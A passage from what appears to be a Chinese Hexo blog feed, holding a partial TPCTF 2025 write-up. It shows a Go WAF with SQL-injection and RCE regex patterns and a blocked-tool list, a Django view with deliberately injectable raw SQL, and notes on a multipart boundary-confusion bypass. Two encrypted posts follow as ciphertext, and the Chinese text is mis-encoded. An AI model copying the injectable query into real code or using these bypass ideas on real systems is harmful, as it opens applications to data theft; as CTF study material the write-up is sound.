class="hljs-keyword">var</span> blockedIPs = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>&#123;<br><span class="hljs-string">&quot;1.1.1.1&quot;</span>: <span class="hljs-literal">true</span>,<br>&#125;<br><br><span class="hljs-keyword">var</span> sqlInjectionPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span>)<br><br><span class="hljs-keyword">var</span> rcePattern = regexp.MustCompile(<span class="hljs-string">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span>)<br><br><span class="hljs-keyword">var</span> hotfixPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(select)`</span>)<br><br><span class="hljs-keyword">var</span> blockedUserAgents = []<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;sqlmap&quot;</span>,<br><span class="hljs-string">&quot;nmap&quot;</span>,<br><span class="hljs-string">&quot;curl&quot;</span>,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedIP</span><span class="hljs-params">(ip <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> blockedIPs[ip]<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isMaliciousRequest</span><span class="hljs-params">(r *http.Request)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.URL.Query() &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;é˜»æ­¢ SQL æ³¨å…¥: å‚æ•° %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;é˜»æ­¢ RCE æ”»å‡»: å‚æ•° %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;å‚æ•° %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> r.Method == http.MethodPost &#123;<br>ct := r.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>mediaType, _, err := mime.ParseMediaType(ct)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;è§£æ Content-Type å¤±è´¥: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> mediaType == <span class="hljs-string">&quot;multipart/form-data&quot;</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseMultipartForm(<span class="hljs-number">65535</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;è§£æ POST å‚æ•°å¤±è´¥: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseForm(); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;è§£æ POST å‚æ•°å¤±è´¥: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.PostForm &#123;<br>log.Printf(<span class="hljs-string">&quot;POST å‚æ•° %s=%v&quot;</span>, key, values)<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;é˜»æ­¢ SQL æ³¨å…¥: POST å‚æ•° %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;é˜»æ­¢ RCE æ”»å‡»: POST å‚æ•° %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;POST å‚æ•° %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedUserAgent</span><span class="hljs-params">(userAgent <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> _, blocked := <span class="hljs-keyword">range</span> blockedUserAgents &#123;<br><span class="hljs-keyword">if</span> strings.Contains(strings.ToLower(userAgent), blocked) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">reverseProxyHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>clientIP := r.RemoteAddr<br><span class="hljs-keyword">if</span> isBlockedIP(clientIP) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;é˜»æ­¢çš„ IP: %s&quot;</span>, clientIP)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>bodyBytes, err := io.ReadAll(r.Body)<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Request&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))<br><br><span class="hljs-keyword">if</span> isMaliciousRequest(r) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Malicious request detected&quot;</span>, http.StatusForbidden)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> isBlockedUserAgent(r.UserAgent()) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden User-Agent&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;é˜»æ­¢çš„ User-Agent: %s&quot;</span>, r.UserAgent())<br><span class="hljs-keyword">return</span><br>&#125;<br><br>proxyReq, err := http.NewRequest(r.Method, backendURL+r.RequestURI, bytes.NewBuffer(bodyBytes))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br>proxyReq.Header = r.Header<br><br>client := &amp;http.Client&#123;<br>CheckRedirect: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;,<br>&#125;<br><br>resp, err := client.Do(proxyReq)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> resp.Header &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> key == <span class="hljs-string">&quot;Location&quot;</span> &#123;<br>value = strings.Replace(value, backendHost, r.Host, <span class="hljs-number">-1</span>)<br>&#125;<br>w.Header().Add(key, value)<br>&#125;<br>&#125;<br>w.WriteHeader(resp.StatusCode)<br>io.Copy(w, resp.Body)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, reverseProxyHandler)<br>log.Println(<span class="hljs-string">&quot;Listen on 0.0.0.0:8080&quot;</span>)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:8080&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>viwe.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> connection<br><br><span class="hljs-comment"># Create your views here.</span><br><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse,HttpRequest<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> AdminUser,Blog<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br>    username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;you are not admin.&#x27;</span>)<br>    password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    users:AdminUser = AdminUser.objects.raw(<span class="hljs-string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">assert</span> password == users[<span class="hljs-number">0</span>].password<br>        <span class="hljs-keyword">return</span> HttpResponse(os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;wrong password&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦çœ‹ä¸¤éƒ¨åˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(<span class="hljs-params">request:HttpRequest</span>):<br><span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&#x27;POST&#x27;</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br>username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br><span class="hljs-keyword">if</span> username != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;you are not admin.&#x27;</span>)<br>password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>users:AdminUser = AdminUser.objects.raw(<span class="hljs-string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">assert</span> password == users[<span class="hljs-number">0</span>].password<br>    <span class="hljs-keyword">return</span> HttpResponse(os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>))<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;wrong password&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> sqlInjectionPattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(union.\*select|select.\*from|insert.\*into|update.\*set|delete.\*from|drop\s+table|--|#|\\\*\\/|\\/\\\*)\`</span>)<br><br><span class="hljs-keyword">var</span> rcePattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(\b(?:os|exec|system|eval|passthru|shell\_exec|phpinfo|popen|proc\_open|pcntl\_exec|assert)\s\*\\(.+\\))\`</span>)<br><br><span class="hljs-keyword">var</span> hotfixPattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(select)\`</span>)<br></code></pre></td></tr></table></figure><p>å¡äº†å¾ˆä¹…ä¸çŸ¥é“æ€ä¹ˆ bypass</p><p>çœ‹å¤§ä½¬çš„åšå®¢çŸ¥é“æ˜¯è¦åˆ©ç”¨<code>multipart/form-data</code>æ¥bypassğŸ˜…åˆä¸€ä¸ªçŸ¥è¯†ç›²ç‚¹ <a href="https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/">å‚è€ƒ1</a><a href="https://www.cnblogs.com/throwable/p/15740444.html">å‚è€ƒ2</a></p><p>ä»£ç å‘ç°é™åˆ¶ä¸º admin</p><p>çœ‹åˆ°æºç é€»è¾‘å°±æ˜¯sqlçš„<a href="https://www.anquanke.com/post/id/253570">quineæ³¨å…¥</a>ğŸ˜…æ€ä¹ˆè¿™ä¹ˆå¤è€çš„åˆæ‹¿æ¥è€ƒå•Šï¼Œå…³é”®æ˜¯æˆ‘è¿˜ä¸ä¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250313000506076.png" alt="image-20250313000506076"></p><p>æ²¡æœ‰å¤ç°æˆåŠŸï¼Œç¯å¢ƒæœ‰ç‚¹é—®é¢˜</p><h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>çœ‹ä¸æ‡‚,æœ‰æœºä¼šå¤ç°å§</p><h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>éš¾</p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›</category>
      
    </categories>
    
    
    <tags>
      
      <tag>éš¾åº¦çˆ†å¤§</tag>
      
      <tag>xss</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNEXTæ¼æ´ç ”ç©¶</title>
    <link href="/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <url>/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7c61d2056093479cad791756f6bd4a1941b099c9116976da5b033af1ec91aa46">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d01c6a972f45fcd5e32e917f9e46f0a1ab08b53e9b5ad84ccac7dd269e3c4b3c3bceb8870b88672f4dfe3ca64a7ae5f83646d3edf72b74c0a2aae94f5d02e3834df2e30fe7a990ad1aae995af2fcdd00bfb6f9208cb4f3b1b20ce31a2a1d8e4bc7e92a7c0d432b800f6fff61957547c7255698f01c59ff6f0c9a9775c9e6418497316c574cf5a79761b1edbfd753c7c9c3b17e5bc7df14cf3d13e89af2263d6718ee3227db78c3137fff36b7bb57f2b66739508f773a55d1f8872e18a00a8dba40a82cc1ba6cb6e88b538ac204adf8fef8a64fcac38d0ad4c76f8fb52dfe59a5a68edbcbbc0ccefc9d29780736507d27402fef05d3ec4d207481c9ab433f58ccd5cf6fc1621114c3f5baf7a885f9606d71cf88f694181a76575a7b109e4d096b23e685b3e04ca5fbf32880360f26b8b1ca0e8516fee59b86cd6f38884f8705b541602bf62533797ee26ac17dae4f75a2d7bb104cc041e8f7df33fa61690cbb916af0cf31c69e0899d09995f04857370c7bdb32247cd96835b65ec6856f01dd39560c70b75e962e1872a07a17e9e0a7e70d2a4ff5187aa3154c55f7003698d2bced7514e376c01f4ee112026aa06abf1cab15a1c6b7c5b8a7a73d53e5ec15e58c86acb6fdfa7a510115f194d5d828352d9ff9e4a4dfa72fd165352a352447d5bf537d678e33d0f4e7fb4b71c3a7eb6b45db5bc7c55ef6f680ef6acea620bd2d73c0721067ef155efefcf147ddccc67e6f6e945c1ddde6b5deda60c08e63221b639010cbd556f788c2de6aad0c773a364e74461e5cc2a13269cffa11f4fa169804f272abe17d46227cd7200ed409e978b0941df0470209d4bfc2f0c2adffe02fddd4cb2f00f75a73b80fc1ad35cbaa7e591308640fb0d1e04d4db0f47ce82d6721eecf045cb2b54975a07b0a734999ca8d49cef2d756111e6b33a24ee073909ea53b7fa0d2299d6d1e3d5d8079fc12dba3b061887f24a87a7892c15521f8a7861262e3c00c0d31b0113e4ca56ef1e81a94fac97a974aae0e4bfddada01570bf05bd5890a9c6a4b4378150d0973cba20c10dc515b33f21724f3218eaaab83f239fdbc888474ecc6df22888b7d4e66a4a0038403015fc6b0a0fa7e269b18605bcf0d98311f1bc173e9cbc49b33a9c267e40bd725c2ed89bf007ac61f1205d719b42f3920a8a922e5d20a04f3eb13ba7b178e51b3189ec34d6a6b7efa90a427260afefcac52b37278ff4e50c70b813f0eade9d0c41735ac4079bb7ae785c276beb8b5ec46852784b47e7e791ea90ca9088858e8982c74e29c4e4f860104e390c3aacbbf0fa0152ef2b393d0ebe98f290805dd3326d3c3812753b1a91369eeff4365333dc282717c2bd6df1e514142943db635a19a34e04ba58a117ed5ed3b742bbb8db2e4c9c034a12e521b2f3cb8a8616e1908040eedf28dabb45b740a8249e2e85cb95649105b073a514138ad69dc112aa22d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nssctfæ–°æ‰‹èµ›</title>
    <link href="/2025/03/02/nssctf%E6%96%B0%E6%89%8B%E8%B5%9B/"/>
    <url>/2025/03/02/nssctf%E6%96%B0%E6%89%8B%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8997cda3688733ab14a58bff80cc9d2e37330196c154de2fe4484d3cc58f9a7">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0e7b5f4338468979a6e350a612e8956e191b78432dfa6e1d0682aea7f5664d9f227084a56e941a507dc43c7fb18ffd5e3191b2623ce83bf82983a93a7af7e5c65384ee198ce5ff1c1c1b52650f173e14a037d951a7fa990b7ba49cbd5c6cabdbff834e0820a5709c59791d7ef5a910ff418225e889087fe65ac8c9a74f95648f344088e8304521e9c055bd20d0546a1eb2d7fd6792087dfc43515ffd88b7fa366a6d634098e712bada57938a32cc09221710eebf0fdb1aeccdbf55a4908108af22dcd94a3592f4360ca04183e9693c8d38c8bf8fc14756a1efce63387860c80fad926bab156e2120ce13e5cd6d1713192b71571f695188016c40569d27f0f02e762ac5ba63edc9d20160140dc816ed44fe73968a3b4de1c98cb9489325638a213ecc62301eb44c04ed566813c6ab4aeafb9c615ced1ca71a95104a1c381da0a8cd2b4cbfdd1f755d23c35f149ddd512941f449dc7223784c485fcae9f756e8d3e7f973fa93b1885fef4bd534c796694fb29fa1df1a0b65dc17376eca7a028543252515f8df4b9fb0b83af786e84b8728a437deb0f20139205703c3ff0f34439dc6c15f5b038b46379bd621796db4f52d9df565e9d9d001d0e7c2bda423d17011c862e84daeafb17416b6f5cd83bf5b5c40cf6e3ad946ff380e8782114261df54e0b33cc146a34cf602e8c9a484604e0c90d3e3ad92ba750b5a43e84d4dc69e745b44782010442fd683a06fbef3bb0cd2a6c4d40e8e24c3565429f87ed44335dd67bc1761189b4eb9dbb91ada74ecb87d0b1ba57525175cb6a72a48a0ed9972d0c531e6d3cce967b9acf3b5415668205dbafc3a9f707f2b009f4983a07d9668b4bf0c29497fe8fa1c63a88f2181faf402d3f8ac5f9ceaa11b90c21d1508fd97cebfb565ef776c06ff3fa7738ae376d7390f0286edf74e96a8db263aa4ab2f9f660811393245a8b2f87c571623dff62cf3a08159d52ba048939b03da7608f8880c966df4bcf810bb5899787ffa7e6b0853e4e24378e85a62f49515fed7eec08392d8ebfa5a0f226d6414fc4ff585dee8b450339bac2174b4488b80a7b5e086e2524548ce6f62d8c1c22f931184ac96acebfe7672eb1a7b87b720e0a74b765dc554161eaf26e675a3b1db3e8885d4715f2948dd19bc16f248570052c2f3c62c304fbf5c58dc35ade823fcf46879352ec59e3f993e24c5db1c4c83f6647fbaf7849eae932b72e719cf6cdded52d4f9bbda9c621bc7625d27542367544dc6c5a6c7fdd23907e48a013bc4d24cfaaf1cb0f76e111d992ec8a185e72ab405d2dd175302c1c33688efc499de7b95cfddce034ce1a91aee36bb9ab6ba50a3c10ea555862dceba5e20a9985893bccc0fa9787ea1d1e80560ac65b917e1d0a254bb373d15e6012f40cf32a7ff9561261bc26f1b587db2510811fade35afc5e58b2ce67f42fea2f0fd529073b157aaf02da5b875bae8939f6bd67ad757a84f594d02bc63ad4027bd31a6e7c2622b0bb01f753efc421522ff6413ffdaf009413c364175940336caa5ee6bcfb099eb444d4ba265368707dd526db79f793d02a1d3c6dfd438f73ad12c38eb5d52d44e170991f45dd3432c7f8d16d403426f6bf8153e13c64ffb6a44cb38b3a469d635a570e355ecc204d3a1e2dc8d4c976c18500e835decc1915c94631be8611ee0c38e34a4e560268342317c02c39e996c1158396c5d21d93f767e16a68b64548583c5d7d3c456f776f912c36044661268b7ec10a7ecdafb99a50c6b2948e251d5090c2ae45aa57a247e19287ee087b7b3964076a6c49cfd21084adbb53d61b84a42e5ac5fac253c6e811ee33fa4123859c88608003c6fb95e03f97ad5d0e4eb2383917d5ca98d818d76c0e6ca2b39ff6ef99aab68be253116005f60b28b76b91e24da2e52973f990ceca1ad78c0d1bea98fb9c561740e9e30eec7c9ac6a7db5d6f26979a0632b3de71039d8c4e87ec27c1603a65ac068da0441112455fe7fcc6538fae9e9f6d506892efef7ea1f3448e1332e1752a28ae355a503f12989a5ac88d040690ed9f72d1b4300fd1fb7a6737db89a4cacb390f02ab4e054cd96c99b3aa4f7cf903b9bf36fdb8f5025b5cefe87cd7bcb57b2f3aa6ac534cabfe8db060ecfb5dd9e5d6a25bdd3b278090a1acd8e5f501c25762a309317292dea1f7464aecb99e0c515949086c7e70a4f34581782e42e25753813702b0c2c93008e0782302c04d4be7132be51313d69517722df72b7f7df763510c7b56b913a745a4e8a725fc50c52e643a9e4eb54d2d431d5405fffb99e9d392827f397fd33c779b7e970775417de16a6c0958e566d4ae19b3b4a0a3973024c0c2dc136581d2cb71e465f7114a259972a29f32cf26efc2de2dea49454fcde6ed6517d51a16fd22492d9fa342635c4f1b8fc82e3132aee8154ee541147a590265443ac578b311f46adaabfad7b5d1426f48b02b8504827da00e47679d991fb3cc94bbebf489875af8e5e40a085d0ee3b1c6df4c10bc98dc6764931bba4895fa96e7c19174fc5e97cb2880356b41a6a834dac885704a426cda39f04ff2214ae8f0afdadd11a03480e96deef32c7f277decfda2710fc591d901861020902e8d43c8720e6e84574385817d88f2d659b94d1dd31c8ad44bd2c0773213191c08655dddbef6e8d920d73b7b222c05c963a203cc78b624f8bebaf6dce60ca12d4e704b01e6b81a3d5818a87362ceec3a6fa0e2cadff1854217dc058dcc6cbee48f3809efa62185da94ac498def13fe188b0e1de97e989c84ccfa85b538ecf520a657752f2d1dd0ee19c7a77db3a6932129d6068a4d1b907c4fbcf141b8408fa6a930cc05c88299c229fb28b796caa6fd169eebad544fa1808d04474331c9001b5ec4b2536ff1d11939a788e7b6e55b513be32c923146e857ef288f0cbdaa355e87277a131e9933aa0bcecb72ad8e312179c6d40c950052d3bfef162e58728bb9fc91aa7a3de5f924d8d36ea15638780f01f95b9c83bf22bd8d24e6d92f05cc9d96666fd0037349f5a08e368f1bc8736ac6d70d33a6dc93b0ddb1c00fa6435c1f6ffb79e1abeb45a4123d5c2ca58747746069e607e2dddd281657153c92608388f8a9b70f17a3bf6e432a8728396418d8d15ff9a22eca44e3fa854a4088594ccad062b9211b63d64fa6151ca5116ceaf44873fb1f70eaa1df8ea3c408de7a0c3bcd62091d8d7990fc180dafe25e9d70cd89a3baf4f8af5742614818336ad377e48fd0e590e55d7a6c42e24f401f0495ee57716f0dee8ac5089d06ed16d18b15fb8f2799a5aad60b3df0a0289260db8efde1c8d7757a0122d15574858cb66433df0b7d05ea0a69d1169aef3f96167a74f61d5cdee7bd4ff09bd284624f39bb25ed0f4dd7afc5b6d68167e5892764461a845a1ee37c947c3bbb01ddd78160b8649df3143abf5b62225e49bbb53eabca97a07c07654d4a2169fed5f8df11c1ee8e1139fa5fc9fb75b83dd67e4dc289f738a64c684bf4dc974301e5def5adaec5f02edb69d1f9576d84a48cf69fd42e6f5444a97726908d5eb0d093deebb81de002f7cf21ee5b0623a5351d65065a425b59733ecd7e2cfc2cdf04a49f17e3fccb357cf52955e89fa3a18a5ff1328d1783f3d9579b9b56e56751e234806c57be84f95def602abc58e3d6a5202686bf1367f8fab5675de3d2f2cb42aa6243381e765b1c5bdd2e0173125d48a17755e9913bccaff3c95693333e32644769bd35632df213b91ab15b2795b2960400949c9a047c1ce5f98a4cd8e4972ecb8d70ba7e953b946df32548ddcb29d84372be0b3bf5d2b95b4b15eeeff1b4a14a0f903f893547bff8b89de2c9debaffd316b4d4358cb1c737ceae1ce6450f9f88c06b31cfa3c37f9ff2b5306647a6b19744c8fec6bce23e1743526671174f26c9dd850a5ed35c30d7f9dba66f57fddaa289751c343bd1b0473d145aa8c1119dc6f9baff6de7cd003a6e86863e2350a4a877f66685b31271298a683468c1cc7c2ea9114d5e9cb45ccda79a46f8736e825574a2472437b51b76c82a7333498633ab211cf6068ce9f0e880802b00b1c425f0c1eaed656b5ec7f082576391d126efa74cffe4f8da09aab34e2649a1df311a8b8513db1ab7352b8db86b8b25fc3deddf362a00362278b948a030af79fbac03e49f7cd00addc619f4a7798f9b656bba136dfd8af03c027b08d963d4a967c4a2f9239150b6aa738d49e3acc5e9c625ebb9069b0dc7c92050aa5a4a1152bca6e489676a4f586ed28709e2947ab84565c68a7f942497d49ed9247fef44e0ccf047406c51dddcac242fd3e3ad5fd3e2e482022e79efa05db8b85c2f8dba8821fe60c9f0450c0d5f4778396b898971dbe8e8562a01e974e4693498a122e32a21d45d5f7cf63db0640ad02f643c61d170477e4723c454e5c21c17bab90d46b66a97c86467545c04d4749a1f3c9a757e94f3341d761ae4520091075211f01d84bdc90d125cf9ac25f7cbd983c687512fdc7e702229f721ad53f0bbac3cf5ea3cd61865058a42c8011ea8348f01109c563cf8e5745ed17d76e515ff04777f09be3eaabdf94d2fb839e80875040cb159a7f3e87ad4a151028f30dbbaa552a64140f3b5b449f318abaa484d814bbc85838254e3e2219206410d16a9b88a108d6173e06f0401a799d8805ed15ef22750167cd470f66957925dd80d61fa3b4e9de9fed80b880d52015f2ec155b5deb3a961458da9c50ddf6986c7b4575300ce1afb